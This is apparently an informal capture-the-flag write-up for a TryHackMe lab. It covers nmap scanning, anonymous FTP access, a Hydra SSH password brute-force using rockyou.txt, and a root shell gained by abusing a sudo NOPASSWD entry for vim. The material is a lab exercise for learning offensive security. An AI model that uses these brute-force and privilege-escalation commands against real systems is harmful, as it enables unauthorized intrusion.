
## nmap

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.47.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT

80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3

2222/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q>
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

## Directories brute-forcing...

[05:49:50] 200 -  540B  - /robots.txt
[05:49:54] 403 -  301B  - /server-status
[05:49:54] 403 -  302B  - /server-status/
[05:49:58] 301 -  315B  - /simple  ->  http://10.201.92.122/simple/ # this endpoint is where the vulnerability lies but I didn't know haha

## FTP

# default login available for sale...
┌──(kali㉿kali)-[~/TryHackMe/Simple_CTF]
└─$ ftp 10.201.92.122
Connected to 10.201.92.122.
220 (vsFTPd 3.0.3)
Name (10.201.92.122:kali): ftp
230 Login successful

# ftp was in passive mode idk what that means but we got out with idk what
ftp> ls
229 Entering Extended Passive Mode (|||49864|)
dir
ls

# solution...
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.

# got something
ftp> cd pub
250 Directory successfully changed.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |************************************************************************************************************************|   166       64.99 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.45 KiB/s)
ftp> exit

        *** The username was found through the file we got in ftp ***

# Bruteforcing with Hydra

┌──(kali㉿kali)-[~/TryHackMe/Simple_CTF]
└─$ hydra -l 'mitch' -P /usr/share/wordlists/rockyou.txt 10.201.92.122 ssh -s 2222 -f -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[2222][ssh] host: 10.201.92.122   login: mitch   password: secret  //found the credentials by bruteforcing...

## ssh

┌──(kali㉿kali)-[~/TryHackMe/Simple_CTF]
└─$ ssh mitch@10.201.92.122 -p 2222
The authenticity of host '[10.201.92.122]:2222 ([10.201.92.122]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.201.92.122]:2222' (ED25519) to the list of known hosts.
mitch@10.201.92.122's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$

#logged in successfully...

 
## priv.esc

        *** found out that user can run root on a filepath:
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ sudo -l -l
User mitch may run the following commands on Machine:
Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
        /usr/bin/vim

# escalating priv. by writing bash in path
  $ sudo /usr/bin/vim

[No write since last change]
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)

            ***  erhm... later found out that we need to abuse a CVE not bruteforce haha.  ***
